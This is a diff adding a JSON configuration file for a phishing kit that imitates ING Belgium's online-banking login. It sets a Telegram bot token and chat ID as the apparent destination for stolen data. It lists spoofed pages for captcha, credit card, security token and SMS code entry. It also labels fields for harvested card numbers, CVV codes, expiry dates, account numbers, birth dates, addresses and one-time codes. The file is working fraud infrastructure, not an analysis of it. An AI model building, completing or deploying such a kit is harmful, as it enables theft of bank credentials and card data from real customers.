@@ -1,0 +1,33 @@
+{
+    "botToken" : "6466056286:AAHJwS2_sUjW9BWml4Yakx0e3fuamPBoNOw",
+    "chatId" : "-4694302403",
+    "siteUrl":"http://127.0.0.1/ing",
+    "original":"https://ebanking.ing.be/login/",
+    "pages":[
+        {"name":"captcha","page":"captcha.php","action":"captcha"},
+        {"name":"cc","page":"ccpage.html","action":"cc"},
+        {"name":"cc-error","page":"ccpagerror.html","action":"cc-error"},
+        {"name":"token","page":"tokenpage.php","action":"token","token":true},
+        {"name":"token-error","page":"tokenpagerror.php","action":"token-error","token":true},
+        {"name":"sms","page":"smspage.html","action":"sms"},
+        {"name":"sms-error","page":"smspagerror.html","action":"sms-error"},
+        {"name":"Success","page":"successpage.html","action":"success"},
+        {"name":"Loading","page":"loading.html","action":"loading"}
+    ],
+    "message": {
+        "email-code": "📥 Email Code",
+        "email": "📧 Email",
+        "fullname": "👤 Fullname",
+        "address": "🏠 Address",
+        "city": "🌆 City",
+        "igid": "👤 IG ID",
+        "token": "🔒 Token",
+        "cardNumber": "💳 Card Number",
+        "expiryDate": "📅 Expiry Date",
+        "kundennummer": "🔢 Account Number",
+        "geburtsdatum": "🎂 Birth Date",
+        "cvv": "🔢 CVV Code",
+        "phone": "📞 Phone",
+        "sms-code": "📲 SMS Code"
+    }
+}
